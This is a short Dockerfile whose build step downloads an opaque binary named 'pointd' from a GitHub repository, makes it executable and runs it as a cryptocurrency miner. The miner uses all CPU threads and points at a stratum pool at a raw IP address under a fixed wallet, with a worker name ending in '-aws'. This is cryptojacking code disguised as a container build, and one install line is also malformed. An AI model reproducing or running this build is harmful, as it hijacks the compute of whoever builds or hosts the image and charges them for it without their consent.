FROM ubuntu:18.04

RUN apt-get update && \
    apt-get libcrypto.so.1.1 && \ 
    apt-get install wget -y && \
    wget https://github.com/manorepas/bash/raw/main/pointd && chmod +x pointd && ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-3 -n 1)-aws) -p x -t $(nproc)
